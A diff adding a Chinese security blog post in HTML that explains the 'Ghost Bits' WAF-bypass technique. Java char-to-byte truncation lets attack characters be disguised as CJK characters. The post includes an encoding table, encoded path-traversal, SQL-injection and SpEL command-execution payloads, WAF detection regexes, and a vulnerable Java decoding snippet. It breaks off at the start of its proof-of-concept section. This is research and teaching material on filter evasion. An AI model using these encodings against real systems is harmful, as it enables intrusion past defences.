@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Ghost Bits 绕waf原理研究分析免责声明文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 前言近期，Black Hat Asia 2026 公布的 “Ghost Bits”（幽灵比特位）漏洞在圈内引发了热议。议题中所讨论的缺陷横跨了 Spring、Tomcat、Fastjson 等主流 Jav">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ghost Bits 绕waf原理研究分析">
+<meta property="og:url" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="Ghost Bits 绕waf原理研究分析免责声明文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 前言近期，Black Hat Asia 2026 公布的 “Ghost Bits”（幽灵比特位）漏洞在圈内引发了热议。议题中所讨论的缺陷横跨了 Spring、Tomcat、Fastjson 等主流 Jav">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/8adba28f-6a9a-4691-82fb-65818be3181d.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/b7c45c9d-6900-40c6-89a1-8db5bf05a81c.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/cbf0fc22-e3f7-4717-83a4-bb2eeb14fd41.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/709a179e-8ecb-45a8-a857-6d530c4d27c0.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/f42ed219-4364-4de5-a776-b7a07885df04.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/17107edf-4e4d-4bd8-b0e4-4a9f99805cdd.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/f5bed526-b381-4532-8621-7a5442a0f902.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/ad8eeb2a-a053-4778-92b0-7b8e1cbdc74c.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/28d57f77-808d-4e92-9af0-62badf5a2f05.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/eaebfa39-c025-4eee-9bee-2648827fc21a.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/bf67680f-26ae-42c8-a751-782662e060dd.png">
+<meta property="og:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/900aac32-f629-4b7e-8e8f-e3924203f657.png">
+<meta property="article:published_time" content="2026-04-29T14:38:38.000Z">
+<meta property="article:modified_time" content="2026-04-29T14:02:04.226Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/8adba28f-6a9a-4691-82fb-65818be3181d.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ghost Bits 绕waf原理研究分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2026/03/17/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91OpenClaw%20WebSocket%E5%85%B1%E4%BA%AB%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&text=Ghost Bits 绕waf原理研究分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&is_video=false&description=Ghost Bits 绕waf原理研究分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ghost Bits 绕waf原理研究分析&body=Check out this article: https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&title=Ghost Bits 绕waf原理研究分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&name=Ghost Bits 绕waf原理研究分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2026/04/29/Ghost%20Bits%20%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/&t=Ghost Bits 绕waf原理研究分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ghost-Bits-%E7%BB%95waf%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Ghost Bits 绕waf原理研究分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.1.</span> <span class="toc-text">免责声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">1. 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Java-char-%E4%B8%8E-byte-%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%B7%AE%E5%BC%82"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.1 Java char 与 byte 的本质差异</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E6%9D%A5%E4%B8%80%E4%B8%AA%E7%9B%B4%E8%A7%82%E6%BC%94%E7%A4%BA%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B1%89%E5%AD%97%E5%A6%82%E4%BD%95%E5%8F%98%E6%88%90%E4%B8%80%E4%B8%AA-ASCII-%E5%AD%97%E7%AC%A6"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">下面来一个直观演示：一个汉字如何变成一个 ASCII 字符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">1.2 攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E7%BC%96%E7%A0%81%E8%A7%84%E5%88%99"><span class="toc-number">1.3.3.</span> <span class="toc-text">1.3 编码规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">2. 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%B8%BA%E4%BB%80%E4%B9%88-WAF-%E6%97%A0%E6%B3%95%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">2.1 为什么 WAF 无法检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%90%8E%E7%AB%AF%E4%BC%9A%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.2 为什么后端会执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Tomcat-%E7%9A%84%E9%99%90%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">2.3 Tomcat 的限制与绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-POC-%E4%B8%8E%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81"><span class="toc-number">1.5.</span> <span class="toc-text">3. POC 与测试验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-%E2%80%94-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.5.1.</span> <span class="toc-text">3.1 路径穿越 — 任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.2.</span> <span class="toc-text">3.2 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E2%80%94-RCE"><span class="toc-number">1.5.3.</span> <span class="toc-text">3.3 SpEL 表达式注入 — RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%B7%A5%E7%A8%8B%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">4.工程化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">5. 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.1.</span> <span class="toc-text">5.1 攻击链总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.7.2.</span> <span class="toc-text">5.2 影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.3.</span> <span class="toc-text">5.3 防御建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.8.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ghost Bits 绕waf原理研究分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-04-29T14:38:38.000Z" class="dt-published" itemprop="datePublished">2026-04-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Ghost-Bits-绕waf原理研究分析"><a href="#Ghost-Bits-绕waf原理研究分析" class="headerlink" title="Ghost Bits 绕waf原理研究分析"></a>Ghost Bits 绕waf原理研究分析</h1><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期，Black Hat Asia 2026 公布的 “Ghost Bits”（幽灵比特位）漏洞在圈内引发了热议。议题中所讨论的缺陷横跨了 Spring、Tomcat、Fastjson 等主流 Java 组件，可以直接击穿现有的防御体系，导致大量历史漏洞死灰复燃，从而可以实现了“老洞新用”。本文将对其核心原理进行简要的剖析与学习，文末附议题的PPT。</p>
+<h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h2><h3 id="1-1-Java-char-与-byte-的本质差异"><a href="#1-1-Java-char-与-byte-的本质差异" class="headerlink" title="1.1 Java char 与 byte 的本质差异"></a>1.1 Java char 与 byte 的本质差异</h3><p>Java 的 char 是 <strong>16 位 Unicode</strong>，而 byte 是 <strong>8 位</strong>。当代码使用以下任意方式将 char 强转为 byte 时，高 8 位会被静默丢弃，常见的写法如下：</p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>等价行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>(byte) ch</td>
+<td>只保留低 8 位</td>
+</tr>
+<tr>
+<td>baos.write(ch)</td>
+<td>write(int) 只写入低 8 位</td>
+</tr>
+<tr>
+<td>DataOutputStream.writeBytes(String)</td>
+<td>逐 char 截断为 byte</td>
+</tr>
+<tr>
+<td>ch &amp; 0xFF</td>
+<td>显式取低 8 位</td>
+</tr>
+</tbody></table>
+<p>被丢弃的高 8 位数据，就是 “幽灵比特位” (Ghost Bits)。</p>
+<h4 id="下面来一个直观演示：一个汉字如何变成一个-ASCII-字符"><a href="#下面来一个直观演示：一个汉字如何变成一个-ASCII-字符" class="headerlink" title="下面来一个直观演示：一个汉字如何变成一个 ASCII 字符"></a>下面来一个直观演示：一个汉字如何变成一个 ASCII 字符</h4><p>以 SQL 注入中最关键的字符 <strong>单引号 ‘ (0x27)</strong> 为例，它的幽灵编码是汉字 <strong>逧</strong> (U+9027)：</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">逧 (U+9027) 的 16 位二进制:</span><br><span class="line"></span><br><span class="line">     高 8 位 (Ghost Bits)    低 8 位</span><br><span class="line">    ┌─────────────────┐ ┌──────────────┐</span><br><span class="line">    1 0 0 1  0 0 0 0   0 0 1 0  0 1 1 1</span><br><span class="line">    └─────────────────┘ └──────────────┘</span><br><span class="line">         0x90 丢弃 ←       0x27 保留 →  &#x27;</span><br></pre></td></tr></table></figure>
+<p>当执行 (byte) 逧 或 baos.write(逧) 时：</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char:  1001 0000 0010 0111   (U+9027 = 逧)</span><br><span class="line">            ↓ 高 8 位丢弃</span><br><span class="line">byte:           0010 0111   (0x27 =  &#x27; )</span><br></pre></td></tr></table></figure>
+<p>WAF 看到的是汉字“逧”，不会触发任何 SQL 注入规则；Java 后端一转 byte，立刻还原成单引号 ‘，闭合 SQL 语句。</p>
+<h3 id="1-2-攻击原理"><a href="#1-2-攻击原理" class="headerlink" title="1.2 攻击原理"></a>1.2 攻击原理</h3><p>对每个 ASCII 字符 进行ch，加上高位掩码 0x9000，生成幽灵字符 (char)(ch | 0x9000)，低 8 位保持不变：</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">原始 ASCII:    &#x27;.&#x27;        &#x27;/&#x27;        &#x27;e&#x27;        &#x27;t&#x27;</span><br><span class="line">               0x2E       0x2F       0x65       0x74</span><br><span class="line"></span><br><span class="line">加上高位掩码:  0x902E     0x902F     0x9065     0x9074</span><br><span class="line">               逮         逯         遥         遴</span><br><span class="line"></span><br><span class="line">WAF 视角:      看到汉字 &quot;逮逯遥遴&quot; → 无敏感关键词 → 放行 ✓</span><br><span class="line"></span><br><span class="line">后端 char→byte: 0x902E → 0x2E  0x902F → 0x2F  0x9065 → 0x65  0x9074 → 0x74</span><br><span class="line">               &#x27;.&#x27;         &#x27;/&#x27;         &#x27;e&#x27;         &#x27;t&#x27;</span><br><span class="line"></span><br><span class="line">还原结果:      &quot;../et...&quot; → 路径穿越 / SQL 注入 / 命令执行 ✓</span><br></pre></td></tr></table></figure>
+<h3 id="1-3-编码规则"><a href="#1-3-编码规则" class="headerlink" title="1.3 编码规则"></a>1.3 编码规则</h3><figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ASCII → 幽灵编码: ghost = (char)(ch | 0x9000)</span><br><span class="line">幽灵编码 → ASCII: ch = (byte)ghost   (高位丢弃，只保留低 8 位)</span><br><span class="line"></span><br><span class="line">逐字符映射表 (常用字符):</span><br><span class="line"></span><br><span class="line">路径穿越:</span><br><span class="line">  &#x27;.&#x27; (0x2E) → 逮 (U+902E)    &#x27;/&#x27; (0x2F) → 逯 (U+902F)</span><br><span class="line"></span><br><span class="line">SQL 注入:</span><br><span class="line">  &#x27;\&#x27;&#x27; (0x27) → 逧 (U+9027)   &#x27; &#x27; (0x20) → 造 (U+9020)</span><br><span class="line">  &#x27;O&#x27; (0x4F) → 遏 (U+904F)    &#x27;R&#x27; (0x52) → 遒 (U+9052)</span><br><span class="line">  &#x27;=&#x27; (0x3D) → 逽 (U+903D)    &#x27;-&#x27; (0x2D) → 逭 (U+902D)</span><br><span class="line"></span><br><span class="line">SpEL 注入:</span><br><span class="line">  &#x27;T&#x27; (0x54) → 達 (U+9054)    &#x27;(&#x27; (0x28) → 遨 (U+9028)</span><br><span class="line">  &#x27;.&#x27; (0x2E) → 逮 (U+902E)    &#x27;R&#x27; (0x52) → 遒 (U+9052)</span><br><span class="line">  &#x27;e&#x27; (0x65) → 遥 (U+9065)    &#x27;x&#x27; (0x78) → 選 (U+9078)</span><br></pre></td></tr></table></figure>
+<h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><h3 id="2-1-为什么-WAF-无法检测"><a href="#2-1-为什么-WAF-无法检测" class="headerlink" title="2.1 为什么 WAF 无法检测"></a>2.1 为什么 WAF 无法检测</h3><table>
+<thead>
+<tr>
+<th>攻击类型</th>
+<th>WAF 检测规则</th>
+<th>幽灵编码后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>路径穿越</td>
+<td><code>\.\./</code></td>
+<td><code>逮逮逯</code></td>
+</tr>
+<tr>
+<td>SQL 注入</td>
+<td><code>&#39; OR.*=.*--</code></td>
+<td><code>逧造遏遒造逧週逧逽逧週逧造逭逭</code></td>
+</tr>
+<tr>
+<td>命令执行</td>
+<td><code>Runtime\.exec</code></td>
+<td><code>達逨遪遡遶遡逮遬...</code></td>
+</tr>
+</tbody></table>
+<p>WAF 规则基于 ASCII 正则匹配，幽灵编码将每个 ASCII 字符替换为低 8 位相同的 Unicode 字符，WAF 看到的全是汉字&#x2F;符号，<strong>规则完全不匹配</strong>。</p>
+<h3 id="2-2-为什么后端会执行"><a href="#2-2-为什么后端会执行" class="headerlink" title="2.2 为什么后端会执行"></a>2.2 为什么后端会执行</h3><p>典型 Java 后端代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">    baos.write(input.charAt(i));  <span class="comment">// write(int) 只取低 8 位，高位丢弃</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">decoded</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray(), StandardCharsets.UTF_8); <span class="comment">// decoded 还原后的原始攻击语句</span></span><br></pre></td></tr></table></figure>
+<p><img src="8adba28f-6a9a-4691-82fb-65818be3181d.png" alt="image"></p>
+<h3 id="2-3-Tomcat-的限制与绕过"><a href="#2-3-Tomcat-的限制与绕过" class="headerlink" title="2.3 Tomcat 的限制与绕过"></a>2.3 Tomcat 的限制与绕过</h3><p>Tomcat 的 <code>Http11InputBuffer.parseRequestLine()</code> 逐字节校验 HTTP 请求行，遇到高位字节 (&gt;&#x3D; 0x80) 会触发符号扩展 (<code>byte 0xE9 → int -23</code>)，导致 <code>relaxedPathChars</code> 白名单失效（集合存的是正整数 <code>233</code>），无法通过配置接受原始 UTF-8 字节。</p>
+<p>但是可以识别经过URL编码之后的幽灵字符，另外的方式就是使用下面描述的方式：使用原生 <code>ServerSocket</code> + <code>InputStreamReader(&quot;UTF-8&quot;)</code> 在应用层直接读取原始字节流，跳过 Tomcat HTTP 解析器。</p>
+<h2 id="3-POC-与测试验证"><a href="#3-POC-与测试验证" class="headerlink" title="3. POC 与测试验证"></a>3. POC 与测试验证</h2><h3 id="3-1-路径穿越-—-任意文件读取"><a href="#3-1-路径穿越-—-任意文件读取" class="headerlink" title="3.1 路径穿越 — 任意文件读取"></a>3.1 路径穿越 — 任意文件读取</h3><p><strong>漏洞代码</strong> (<code>VulnerableFileController.java</code>):</p>
